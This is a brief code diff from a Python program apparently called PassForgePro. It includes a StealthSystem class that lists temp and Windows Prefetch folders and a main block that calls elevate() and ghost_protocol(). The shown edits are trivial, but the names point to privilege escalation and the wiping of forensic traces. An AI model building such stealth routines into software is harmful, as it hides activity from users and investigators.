@@ -376,7 +376,7 @@ class StealthSystem:
                 os.environ.get("TEMP"),
                 os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "Prefetch")
             ]
-        else: # linux compatibility tmp...
+        else: # linux compatibility tmp | .cache ...
             paths = [
                 "/tmp",
                 "/var/tmp",
@@ -816,4 +816,5 @@ if __name__ == "__main__":
     StealthSystem.elevate()
     StealthSystem.ghost_protocol()
     PassForgePro().mainloop()
+
 
